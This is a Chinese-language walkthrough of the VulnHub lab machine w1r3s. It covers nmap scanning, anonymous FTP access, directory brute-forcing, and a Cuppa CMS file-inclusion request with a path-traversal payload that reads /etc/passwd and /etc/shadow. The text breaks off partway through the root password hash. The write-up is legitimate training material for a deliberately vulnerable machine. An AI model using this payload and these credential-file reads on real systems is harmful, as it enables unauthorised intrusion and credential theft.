{"pageProps":{"postData":{"id":"Vulnhubw1r3s v1 0","contentHtml":"<h1>w1r3s.v1.0</h1>\n<blockquote>\n<p><a href=\"https://www.vulnhub.com/entry/w1r3s-101,220/\">https://www.vulnhub.com/entry/w1r3s-101,220/</a></p>\n</blockquote>\n<p>思路：红队笔记</p>\n<h2>主机发现端口扫描</h2>\n<ol>\n<li>\n<p>使用nmap扫描网段类存活主机</p>\n<p>因为靶机是我最后添加的，所以靶机IP是133</p>\n<pre><code class=\"hljs language-php\">nmap -sP <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.0</span>/<span class=\"hljs-number\">24</span>\n<span class=\"hljs-comment\">//</span>\nStarting Nmap <span class=\"hljs-number\">7.93</span> ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-09-20 09:09 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.1</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00022</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:C0:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">08</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.2</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00015</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:FB:CA:<span class=\"hljs-number\">45</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.133</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00021</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>C:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">11</span>:<span class=\"hljs-number\">5</span>B:<span class=\"hljs-number\">7</span>D (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.254</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00028</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:F8:B3:<span class=\"hljs-number\">1</span>A (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.131</span>\nHost is up.\nNmap done: <span class=\"hljs-number\">256</span> IP <span class=\"hljs-title function_ invoke__\">addresses</span> (<span class=\"hljs-number\">5</span> hosts up) scanned in <span class=\"hljs-number\">2.14</span> seconds\n</code></pre>\n</li>\n<li>\n<p>扫描主机开放端口</p>\n<pre><code class=\"hljs language-php\">nmap -sT -min-rate <span class=\"hljs-number\">10000</span> -p- <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.133</span>\n<span class=\"hljs-comment\">//</span>\nStarting Nmap <span class=\"hljs-number\">7.93</span> ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-09-20 09:11 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.133</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.0011</span>s latency).\nNot shown: <span class=\"hljs-number\">55528</span> filtered tcp <span class=\"hljs-title function_ invoke__\">ports</span> (no-response), <span class=\"hljs-number\">10003</span> closed tcp <span class=\"hljs-title function_ invoke__\">ports</span> (conn-refused)\nPORT     STATE SERVICE\n<span class=\"hljs-number\">21</span>/tcp   open  ftp\n<span class=\"hljs-number\">22</span>/tcp   open  ssh\n<span class=\"hljs-number\">80</span>/tcp   open  http\n<span class=\"hljs-number\">3306</span>/tcp open  mysql\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>C:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">11</span>:<span class=\"hljs-number\">5</span>B:<span class=\"hljs-number\">7</span>D (VMware)\n</code></pre>\n<p>开放了 <code>21，22，80，3306</code></p>\n</li>\n<li>\n<p>扫描主机服务版本以及系统版本</p>\n<pre><code class=\"hljs language-php\">nmap -sV -sT -O -p21,<span class=\"hljs-number\">22</span>,<span class=\"hljs-number\">80</span>,<span class=\"hljs-number\">3306</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.133</span>\n<span class=\"hljs-comment\">//</span>\nPORT     STATE SERVICE VERSION\n<span class=\"hljs-number\">21</span>/tcp   open  ftp     vsftpd <span class=\"hljs-number\">2.0</span>.<span class=\"hljs-number\">8</span> <span class=\"hljs-keyword\">or</span> later\n<span class=\"hljs-number\">22</span>/tcp   open  ssh     OpenSSH <span class=\"hljs-number\">7.2</span>p2 Ubuntu <span class=\"hljs-number\">4</span>ubuntu2.<span class=\"hljs-number\">4</span> (Ubuntu Linux; protocol <span class=\"hljs-number\">2.0</span>)\n<span class=\"hljs-number\">80</span>/tcp   open  http    Apache httpd <span class=\"hljs-number\">2.4</span>.<span class=\"hljs-number\">18</span> ((Ubuntu))\n<span class=\"hljs-number\">3306</span>/tcp open  mysql   <span class=\"hljs-title function_ invoke__\">MySQL</span> (unauthorized)\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>C:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">11</span>:<span class=\"hljs-number\">5</span>B:<span class=\"hljs-number\">7</span>D (VMware)\nWarning: OSScan results may be unreliable because we could not find at least <span class=\"hljs-number\">1</span> open <span class=\"hljs-keyword\">and</span> <span class=\"hljs-number\">1</span> closed port\nDevice type: general purpose\nRunning: Linux <span class=\"hljs-number\">3</span>.X|<span class=\"hljs-number\">4</span>.X\nOS CPE: cpe:/o:linux:linux_kernel:<span class=\"hljs-number\">3</span> cpe:/o:linux:linux_kernel:<span class=\"hljs-number\">4</span>\nOS details: Linux <span class=\"hljs-number\">3.10</span> - <span class=\"hljs-number\">4.11</span>, Linux <span class=\"hljs-number\">3.2</span> - <span class=\"hljs-number\">4.9</span>\nNetwork Distance: <span class=\"hljs-number\">1</span> hop\nService Info: Host: W1R3S.inc; OS: Linux; CPE: cpe:/o:linux:linux_kernel\n</code></pre>\n<p><code>vsftpd</code> 可能可以使用匿名登陆，可能会有信息泄露，所以优先级高</p>\n<p><code>Apache</code>版本是<code>2.4.18</code></p>\n<p><code>MySql</code>未经授权，所以未能获取到版本信息</p>\n<p>操作系统版本**<code>Linux 3.10 - 4.11</code>** 或 <strong><code>Linux 3.2 - 4.9</code></strong></p>\n<p>主机名为 <code>W1R3S.inc</code></p>\n</li>\n<li>\n<p>UDP扫描</p>\n<pre><code class=\"hljs language-php\">nmap -sU <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.133</span>\n<span class=\"hljs-comment\">//</span>\n无数据\n</code></pre>\n</li>\n<li>\n<p>扫描开放端口漏洞</p>\n<p>我如果不设置<code>--script-timeout 30s</code> 会一直卡在<code>98.xx%</code></p>\n<pre><code class=\"hljs language-php\">nmap -script=vuln -p21,<span class=\"hljs-number\">22</span>,<span class=\"hljs-number\">80</span>,<span class=\"hljs-number\">3306</span> --script-timeout <span class=\"hljs-number\">30</span>s  <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.133</span>\n<span class=\"hljs-comment\">//</span>\nPORT     STATE SERVICE\n<span class=\"hljs-number\">21</span>/tcp   open  ftp\n<span class=\"hljs-number\">22</span>/tcp   open  ssh\n<span class=\"hljs-number\">80</span>/tcp   open  http\n|_http-csrf: Couldn<span class=\"hljs-string\">'t find any CSRF vulnerabilities.\n|_http-dombased-xss: Couldn'</span>t find any DOM based XSS.\n|_http-stored-xss: Couldn<span class=\"hljs-string\">'t find any stored XSS vulnerabilities.\n| http-enum: \n|_  /wordpress/wp-login.php: Wordpress login page.\n3306/tcp open  mysql\nMAC Address: 00:0C:29:11:5B:7D (VMware)\n</span></code></pre>\n<p>没有找到什么漏洞，可能是扫描时间过短的原因，这样子的话我们的优先级就是<code>21→80→3306→22</code> ，因为ftp可能造成文件泄露。web发现了wordpress的登陆页面，也有机会获得进度</p>\n</li>\n</ol>\n<h2>FTP渗透</h2>\n<ol>\n<li>\n<p>尝试下ftp是否能进行匿名登陆</p>\n<pre><code class=\"hljs language-php\">ftp <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.133</span>\n<span class=\"hljs-comment\">//</span>\nConnected to <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.133</span>.\n<span class=\"hljs-number\">220</span> Welcome to W1R3S.inc FTP service.\n<span class=\"hljs-title function_ invoke__\">Name</span> (<span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.133</span>:root): anonymous\n<span class=\"hljs-number\">331</span> Please specify the password.\nPassword: \n<span class=\"hljs-number\">230</span> Login successful.\nRemote system type is UNIX.\nUsing <span class=\"hljs-keyword\">binary</span> mode to transfer files.\n</code></pre>\n<p><code>230 Login successful</code> 登陆成功，接着查找信息</p>\n</li>\n<li>\n<p>把匿名用户能获取的所有文件下载下来，一共有五个文件</p>\n<p><code>01.txt  02.txt  03.txt  employee-names.txt  worktodo.txt</code></p>\n<p>查看内容</p>\n<pre><code class=\"hljs language-php\">cat *.txt      \nNew FTP Server For W1R3S.inc\n<span class=\"hljs-comment\">#</span>\n<span class=\"hljs-comment\">#</span>\n<span class=\"hljs-comment\">#</span>\n<span class=\"hljs-comment\">#</span>\n<span class=\"hljs-number\">01</span>ec2d8fc11c493b25029fb1f47f39ce\n<span class=\"hljs-comment\">#</span>\n<span class=\"hljs-comment\">#</span>\n<span class=\"hljs-comment\">#</span>\n<span class=\"hljs-comment\">#</span>\n<span class=\"hljs-comment\">#</span>\nSXQgaXMgZWFzeSwgYnV0IG5vdCB0aGF0IGVhc3kuLg==\n<span class=\"hljs-comment\">############################################</span>\n___________.__              __      __  ______________________   _________    .__               \n\\__    ___/|  |__   ____   /  \\    /  \\/_   \\______   \\_____  \\ /   _____/    |__| ____   ____  \n  |    |   |  |  \\_/ __ \\  \\   \\/\\/   / |   ||       _/ <span class=\"hljs-title function_ invoke__\">_</span>(__  &#x3C; \\_____  \\     |  |/    \\_/ ___\\ \n  |    |   |   Y  \\  ___/   \\        /  |   ||    |   \\/       \\/        \\    |  |   |  \\  \\___ \n  |____|   |___|  /\\___  >   \\__/\\  /   |___||____|_  /______  /_______  / /\\ |__|___|  /\\___  >\n                \\/     \\/         \\/                \\/       \\/        \\/  \\/         \\/     \\/ \nThe W1R3S.inc employee <span class=\"hljs-keyword\">list</span>\n\nNaomi.W - Manager\nHector.A - IT Dept\nJoseph.G - Web Design\nAlbert.O - Web Design\nGina.L - Inventory\nRico.D - Human Resources\n\n        ı pou,ʇ ʇɥıuʞ ʇɥıs ıs ʇɥǝ ʍɐʎ ʇo ɹooʇ¡\n\n....punoɹɐ ƃuıʎɐןd <span class=\"hljs-keyword\">do</span>ʇs ‘op oʇ ʞɹoʍ ɟo ʇoן ɐ ǝʌɐɥ ǝʍ\n                                                                  \n</code></pre>\n<ul>\n<li>\n<p><code>New FTP Server For W1R3S.inc</code> 指的应该是 新的<code>W1R3S.inc</code> 公司的ftp服务器 ，新的就表示可能存在漏洞</p>\n</li>\n<li>\n<p><code>01ec2d8fc11c493b25029fb1f47f39ce</code>看着特征像是MD5，识别出来是：<code>This is not a password</code></p>\n</li>\n<li>\n<p><code>SXQgaXMgZWFzeSwgYnV0IG5vdCB0aGF0IGVhc3kuLg==</code> 看着像是base64，识别出来是：<code>It is easy, but not that easy..</code></p>\n</li>\n<li>\n<p>中间的Ascii艺术说的是<code>The W1R3S.inc</code></p>\n</li>\n<li>\n<p>还有个职员表，不过只有姓名，在爆破时可能用的上</p>\n<pre><code class=\"hljs language-php\">Naomi.W - Manager Hector.A - IT Dept Joseph.G - Web Design Albert.O - Web Design Gina.L - Inventory Rico.D - Human Resources\n</code></pre>\n</li>\n<li>\n<p>最后有两行翻转过来的字符串，大概是</p>\n<pre><code class=\"hljs language-php\">we have a lot of work to <span class=\"hljs-keyword\">do</span>, stop playtng around<span class=\"hljs-string\">'.\ni don'</span>t think this is the way to root!\n</code></pre>\n</li>\n</ul>\n</li>\n<li>\n<p>好像没用…</p>\n</li>\n</ol>\n<h2>WEB渗透</h2>\n<ol>\n<li>\n<p>访问 <code>http://192.168.75.133/</code> ，页面是<code>apache</code>的默认页面，可能是刚安装完</p>\n</li>\n<li>\n<p>爆破目录都有啥，我们知道的只有<code>wordpress</code>的登录页</p>\n<pre><code class=\"hljs language-php\"> python .\\dirsearch.py -u http:<span class=\"hljs-comment\">//192.168.75.133/</span>\n <span class=\"hljs-comment\">//</span>\n [<span class=\"hljs-number\">10</span>:<span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">57</span>] Starting:\n[<span class=\"hljs-number\">10</span>:<span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">58</span>] <span class=\"hljs-number\">403</span> -  <span class=\"hljs-number\">300</span>B  - /.ht_wsr.txt\n[<span class=\"hljs-number\">10</span>:<span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">58</span>] <span class=\"hljs-number\">403</span> -  <span class=\"hljs-number\">303</span>B  - /.htaccess.bak1\n[<span class=\"hljs-number\">10</span>:<span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">58</span>] <span class=\"hljs-number\">403</span> -  <span class=\"hljs-number\">303</span>B  - /.htaccess.orig\n[<span class=\"hljs-number\">10</span>:<span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">58</span>] <span class=\"hljs-number\">403</span> -  <span class=\"hljs-number\">305</span>B  - /.htaccess.sample\n[<span class=\"hljs-number\">10</span>:<span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">58</span>] <span class=\"hljs-number\">403</span> -  <span class=\"hljs-number\">303</span>B  - /.htaccess.save\n[<span class=\"hljs-number\">10</span>:<span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">58</span>] <span class=\"hljs-number\">403</span> -  <span class=\"hljs-number\">303</span>B  - /.htaccess_orig\n[<span class=\"hljs-number\">10</span>:<span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">58</span>] <span class=\"hljs-number\">403</span> -  <span class=\"hljs-number\">304</span>B  - /.htaccess_extra\n[<span class=\"hljs-number\">10</span>:<span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">58</span>] <span class=\"hljs-number\">403</span> -  <span class=\"hljs-number\">301</span>B  - /.htaccess_sc\n[<span class=\"hljs-number\">10</span>:<span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">58</span>] <span class=\"hljs-number\">403</span> -  <span class=\"hljs-number\">301</span>B  - /.htaccessOLD\n[<span class=\"hljs-number\">10</span>:<span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">58</span>] <span class=\"hljs-number\">403</span> -  <span class=\"hljs-number\">302</span>B  - /.htaccessOLD2\n[<span class=\"hljs-number\">10</span>:<span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">58</span>] <span class=\"hljs-number\">403</span> -  <span class=\"hljs-number\">294</span>B  - /.html\n[<span class=\"hljs-number\">10</span>:<span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">58</span>] <span class=\"hljs-number\">403</span> -  <span class=\"hljs-number\">293</span>B  - /.htm\n[<span class=\"hljs-number\">10</span>:<span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">58</span>] <span class=\"hljs-number\">403</span> -  <span class=\"hljs-number\">303</span>B  - /.htpasswd_test\n[<span class=\"hljs-number\">10</span>:<span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">58</span>] <span class=\"hljs-number\">403</span> -  <span class=\"hljs-number\">299</span>B  - /.htpasswds\n[<span class=\"hljs-number\">10</span>:<span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">58</span>] <span class=\"hljs-number\">403</span> -  <span class=\"hljs-number\">300</span>B  - /.httr-oauth\n[<span class=\"hljs-number\">10</span>:<span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">58</span>] <span class=\"hljs-number\">403</span> -  <span class=\"hljs-number\">293</span>B  - /.php\n[<span class=\"hljs-number\">10</span>:<span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">58</span>] <span class=\"hljs-number\">403</span> -  <span class=\"hljs-number\">294</span>B  - /.php3\n[<span class=\"hljs-number\">10</span>:<span class=\"hljs-number\">15</span>:<span class=\"hljs-number\">00</span>] <span class=\"hljs-number\">403</span> -  <span class=\"hljs-number\">301</span>B  - /.htaccessBAK\n[<span class=\"hljs-number\">10</span>:<span class=\"hljs-number\">15</span>:<span class=\"hljs-number\">03</span>] <span class=\"hljs-number\">301</span> -  <span class=\"hljs-number\">324</span>B  - /administrator  ->  http:<span class=\"hljs-comment\">//192.168.75.133/administrator/</span>\n[<span class=\"hljs-number\">10</span>:<span class=\"hljs-number\">15</span>:<span class=\"hljs-number\">03</span>] <span class=\"hljs-number\">302</span> -    <span class=\"hljs-number\">7</span>KB - /administrator/  ->  installation/\n[<span class=\"hljs-number\">10</span>:<span class=\"hljs-number\">15</span>:<span class=\"hljs-number\">03</span>] <span class=\"hljs-number\">302</span> -    <span class=\"hljs-number\">7</span>KB - /administrator/index.php  ->  installation/\n[<span class=\"hljs-number\">10</span>:<span class=\"hljs-number\">15</span>:<span class=\"hljs-number\">10</span>] <span class=\"hljs-number\">301</span> -  <span class=\"hljs-number\">321</span>B  - /javascript  ->  http:<span class=\"hljs-comment\">//192.168.75.133/javascript/</span>\n[<span class=\"hljs-number\">10</span>:<span class=\"hljs-number\">15</span>:<span class=\"hljs-number\">16</span>] <span class=\"hljs-number\">403</span> -  <span class=\"hljs-number\">302</span>B  - /server-status\n[<span class=\"hljs-number\">10</span>:<span class=\"hljs-number\">15</span>:<span class=\"hljs-number\">16</span>] <span class=\"hljs-number\">403</span> -  <span class=\"hljs-number\">303</span>B  - /server-status/\n[<span class=\"hljs-number\">10</span>:<span class=\"hljs-number\">15</span>:<span class=\"hljs-number\">21</span>] <span class=\"hljs-number\">301</span> -    <span class=\"hljs-number\">0</span>B  - /wordpress/  ->  http:<span class=\"hljs-comment\">//localhost/wordpress/</span>\n[<span class=\"hljs-number\">10</span>:<span class=\"hljs-number\">15</span>:<span class=\"hljs-number\">21</span>] <span class=\"hljs-number\">200</span> -    <span class=\"hljs-number\">1</span>KB - /wordpress/wp-login.php\n</code></pre>\n<p>存在<code>administrator</code>文件夹和<code>wordpress</code> ，先去查看<code>wordpress</code></p>\n</li>\n<li>\n<p>来到<code>wordpress</code>登陆页面，输入之前的用户名，密码随便输，抓包尝试爆破,但是发现数据包host指向的是<code>localhost</code> ，也就是指向我们的<code>127.0.0.1</code></p>\n<pre><code class=\"hljs language-php\"><span class=\"hljs-comment\">//数据包</span>\nPOST /wordpress/wp-login.php HTTP/<span class=\"hljs-number\">1.1</span>\nHost: localhost\n....\nlog=Naomi&#x26;pwd=<span class=\"hljs-number\">123</span>&#x26;wp-submit=Log+In&#x26;redirect_to=http%<span class=\"hljs-number\">3</span>A%<span class=\"hljs-number\">2</span>F%<span class=\"hljs-number\">2</span>Flocalhost%<span class=\"hljs-number\">2</span>Fwordpress%<span class=\"hljs-number\">2</span>Fwp-admin%<span class=\"hljs-number\">2</span>F&#x26;testcookie=<span class=\"hljs-number\">1</span>\n</code></pre>\n<p>应该是还没配置好，我们去<code>administrator</code>目录看看</p>\n</li>\n<li>\n<p>跳转到访问<code>administator</code>目录跳转到<code>/administrator/installation/</code> 是个CMS安装页面，也、页面的title显示的是<code>Cuppa CMS</code> ，经查阅是一个内容管理系统的项目</p>\n<p><img src=\"/post-images/Vulnhubw1r3s%20v1%200/image5.png\" alt=\"image.png\"></p>\n<p>我们尝试<code>next</code> ，毕竟只有这一个交互，<code>Database Name</code> ，<code>Password</code>，<code>Email</code>都是空的</p>\n<p><img src=\"/post-images/Vulnhubw1r3s%20v1%200/image6.png\" alt=\"image.png\"></p>\n<p>尝试输入<code>Database Name</code> = test，<code>Password</code> = test ,<code>Email</code> = <code>test@tets.com</code> ,点击<code>next</code></p>\n<p><img src=\"/post-images/Vulnhubw1r3s%20v1%200/image7.png\" alt=\"image.png\"></p>\n<p>数据表创建成功，不过管理员用户创建失败，并且交互只有一个<code>back</code> ，这块也走不下去了</p>\n</li>\n<li>\n<p>想到Cuppa也是一个开源项目，我们去查阅一下有没有漏洞，因为我们不知道CMS版本，所以都可以尝试下</p>\n<ul>\n<li>\n<p>经查阅法cuppa存在文件包含漏洞，并且很容易利用</p>\n<blockquote>\n<p><a href=\"https://bugtoolz.com/post/cs132020723/\">https://bugtoolz.com/post/cs132020723/</a></p>\n</blockquote>\n<p>在<code>/target/templates/default/html/windows/right.php</code> 下存在一个<code>$_POST['url']</code> ,提交可以访问任意文件</p>\n</li>\n<li>\n<p>访问并抓包<code>/administrator/templates/default/html/windows/right.php</code> 因为是在<code>administator</code>目录安装的</p>\n</li>\n<li>\n<p>抓到包后测试读取<code>/etc/passwd</code> ，记得修改包请求方法，默认访问时GET需要改成POST</p>\n<pre><code class=\"hljs language-php\"><span class=\"hljs-comment\">//req</span>\nPOST /administrator/templates/<span class=\"hljs-keyword\">default</span>/html/windows/right.php HTTP/<span class=\"hljs-number\">1.1</span>\nHost: <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.133</span>\n....\nurl=../../\t../../etc/passwd\n</code></pre>\n<p>读取成功</p>\n<pre><code class=\"hljs language-php\"><span class=\"hljs-comment\">//res</span>\nroot:x:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">0</span>:root:/root:/bin/bash\ndaemon:x:<span class=\"hljs-number\">1</span>:<span class=\"hljs-number\">1</span>:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:<span class=\"hljs-number\">2</span>:<span class=\"hljs-number\">2</span>:bin:/bin:/usr/sbin/nologin\nsys:x:<span class=\"hljs-number\">3</span>:<span class=\"hljs-number\">3</span>:sys:/dev:/usr/sbin/nologin\nsync:x:<span class=\"hljs-number\">4</span>:<span class=\"hljs-number\">65534</span>:sync:/bin:/bin/sync\ngames:x:<span class=\"hljs-number\">5</span>:<span class=\"hljs-number\">60</span>:games:/usr/games:/usr/sbin/nologin\nman:x:<span class=\"hljs-number\">6</span>:<span class=\"hljs-number\">12</span>:man:/<span class=\"hljs-keyword\">var</span>/cache/man:/usr/sbin/nologin\nlp:x:<span class=\"hljs-number\">7</span>:<span class=\"hljs-number\">7</span>:lp:/<span class=\"hljs-keyword\">var</span>/spool/lpd:/usr/sbin/nologin\nmail:x:<span class=\"hljs-number\">8</span>:<span class=\"hljs-number\">8</span>:mail:/<span class=\"hljs-keyword\">var</span>/mail:/usr/sbin/nologin\nnews:x:<span class=\"hljs-number\">9</span>:<span class=\"hljs-number\">9</span>:news:/<span class=\"hljs-keyword\">var</span>/spool/news:/usr/sbin/nologin\nuucp:x:<span class=\"hljs-number\">10</span>:<span class=\"hljs-number\">10</span>:uucp:/<span class=\"hljs-keyword\">var</span>/spool/uucp:/usr/sbin/nologin\nproxy:x:<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">13</span>:proxy:/bin:/usr/sbin/nologin\nwww-data:x:<span class=\"hljs-number\">33</span>:<span class=\"hljs-number\">33</span>:www-data:/<span class=\"hljs-keyword\">var</span>/www:/usr/sbin/nologin\nbackup:x:<span class=\"hljs-number\">34</span>:<span class=\"hljs-number\">34</span>:backup:/<span class=\"hljs-keyword\">var</span>/backups:/usr/sbin/nologin\n<span class=\"hljs-keyword\">list</span>:x:<span class=\"hljs-number\">38</span>:<span class=\"hljs-number\">38</span>:Mailing List Manager:/<span class=\"hljs-keyword\">var</span>/<span class=\"hljs-keyword\">list</span>:/usr/sbin/nologin\nirc:x:<span class=\"hljs-number\">39</span>:<span class=\"hljs-number\">39</span>:ircd:/<span class=\"hljs-keyword\">var</span>/run/ircd:/usr/sbin/nologin\ngnats:x:<span class=\"hljs-number\">41</span>:<span class=\"hljs-number\">41</span>:Gnats Bug-Reporting <span class=\"hljs-title function_ invoke__\">System</span> (admin):/<span class=\"hljs-keyword\">var</span>/lib/gnats:/usr/sbin/nologin\nnobody:x:<span class=\"hljs-number\">65534</span>:<span class=\"hljs-number\">65534</span>:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-timesync:x:<span class=\"hljs-number\">100</span>:<span class=\"hljs-number\">102</span>:systemd Time Synchronization,,,:/run/systemd:/bin/<span class=\"hljs-literal\">false</span>\nsystemd-network:x:<span class=\"hljs-number\">101</span>:<span class=\"hljs-number\">103</span>:systemd Network Management,,,:/run/systemd/netif:/bin/<span class=\"hljs-literal\">false</span>\nsystemd-resolve:x:<span class=\"hljs-number\">102</span>:<span class=\"hljs-number\">104</span>:systemd Resolver,,,:/run/systemd/resolve:/bin/<span class=\"hljs-literal\">false</span>\nsystemd-bus-proxy:x:<span class=\"hljs-number\">103</span>:<span class=\"hljs-number\">105</span>:systemd Bus Proxy,,,:/run/systemd:/bin/<span class=\"hljs-literal\">false</span>\nsyslog:x:<span class=\"hljs-number\">104</span>:<span class=\"hljs-number\">108</span>::/home/syslog:/bin/<span class=\"hljs-literal\">false</span>\n_apt:x:<span class=\"hljs-number\">105</span>:<span class=\"hljs-number\">65534</span>::/nonexistent:/bin/<span class=\"hljs-literal\">false</span>\nmessagebus:x:<span class=\"hljs-number\">106</span>:<span class=\"hljs-number\">110</span>::/<span class=\"hljs-keyword\">var</span>/run/dbus:/bin/<span class=\"hljs-literal\">false</span>\nuuidd:x:<span class=\"hljs-number\">107</span>:<span class=\"hljs-number\">111</span>::/run/uuidd:/bin/<span class=\"hljs-literal\">false</span>\nlightdm:x:<span class=\"hljs-number\">108</span>:<span class=\"hljs-number\">114</span>:Light Display Manager:/<span class=\"hljs-keyword\">var</span>/lib/lightdm:/bin/<span class=\"hljs-literal\">false</span>\nwhoopsie:x:<span class=\"hljs-number\">109</span>:<span class=\"hljs-number\">117</span>::/nonexistent:/bin/<span class=\"hljs-literal\">false</span>\navahi-autoipd:x:<span class=\"hljs-number\">110</span>:<span class=\"hljs-number\">119</span>:Avahi autoip daemon,,,:/<span class=\"hljs-keyword\">var</span>/lib/avahi-autoipd:/bin/<span class=\"hljs-literal\">false</span>\navahi:x:<span class=\"hljs-number\">111</span>:<span class=\"hljs-number\">120</span>:Avahi mDNS daemon,,,:/<span class=\"hljs-keyword\">var</span>/run/avahi-daemon:/bin/<span class=\"hljs-literal\">false</span>\ndnsmasq:x:<span class=\"hljs-number\">112</span>:<span class=\"hljs-number\">65534</span>:dnsmasq,,,:/<span class=\"hljs-keyword\">var</span>/lib/misc:/bin/<span class=\"hljs-literal\">false</span>\ncolord:x:<span class=\"hljs-number\">113</span>:<span class=\"hljs-number\">123</span>:colord colour management daemon,,,:/<span class=\"hljs-keyword\">var</span>/lib/colord:/bin/<span class=\"hljs-literal\">false</span>\nspeech-dispatcher:x:<span class=\"hljs-number\">114</span>:<span class=\"hljs-number\">29</span>:Speech Dispatcher,,,:/<span class=\"hljs-keyword\">var</span>/run/speech-dispatcher:/bin/<span class=\"hljs-literal\">false</span>\nhplip:x:<span class=\"hljs-number\">115</span>:<span class=\"hljs-number\">7</span>:HPLIP system user,,,:/<span class=\"hljs-keyword\">var</span>/run/hplip:/bin/<span class=\"hljs-literal\">false</span>\nkernoops:x:<span class=\"hljs-number\">116</span>:<span class=\"hljs-number\">65534</span>:Kernel Oops Tracking Daemon,,,:/:/bin/<span class=\"hljs-literal\">false</span>\npulse:x:<span class=\"hljs-number\">117</span>:<span class=\"hljs-number\">124</span>:PulseAudio daemon,,,:/<span class=\"hljs-keyword\">var</span>/run/pulse:/bin/<span class=\"hljs-literal\">false</span>\nrtkit:x:<span class=\"hljs-number\">118</span>:<span class=\"hljs-number\">126</span>:RealtimeKit,,,:/proc:/bin/<span class=\"hljs-literal\">false</span>\nsaned:x:<span class=\"hljs-number\">119</span>:<span class=\"hljs-number\">127</span>::/<span class=\"hljs-keyword\">var</span>/lib/saned:/bin/<span class=\"hljs-literal\">false</span>\nusbmux:x:<span class=\"hljs-number\">120</span>:<span class=\"hljs-number\">46</span>:usbmux daemon,,,:/<span class=\"hljs-keyword\">var</span>/lib/usbmux:/bin/<span class=\"hljs-literal\">false</span>\nw1r3s:x:<span class=\"hljs-number\">1000</span>:<span class=\"hljs-number\">1000</span>:w1r3s,,,:/home/w1r3s:/bin/bash\nsshd:x:<span class=\"hljs-number\">121</span>:<span class=\"hljs-number\">65534</span>::/<span class=\"hljs-keyword\">var</span>/run/sshd:/usr/sbin/nologin\nftp:x:<span class=\"hljs-number\">122</span>:<span class=\"hljs-number\">129</span>:ftp daemon,,,:/srv/ftp:/bin/<span class=\"hljs-literal\">false</span>\nmysql:x:<span class=\"hljs-number\">123</span>:<span class=\"hljs-number\">130</span>:MySQL Server,,,:/nonexistent:/bin/<span class=\"hljs-literal\">false</span>\n</code></pre>\n</li>\n<li>\n<p>能读取<code>passwd</code>我们就继续读取<code>shadow</code>文件</p>\n<pre><code class=\"hljs language-php\">root:$<span class=\"hljs-number\">6</span>$vYcecPCy<span class=\"hljs-variable\">$JNbK</span>.hr7HU72ifLxmjpIP9kTcx./ak2MM3lBs.Ouiu0mENav72TfQIs8h1jPm2rwRFqd87HDC0pi7gn9t7VgZ0:<span class=\"hljs-number\">17554</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span 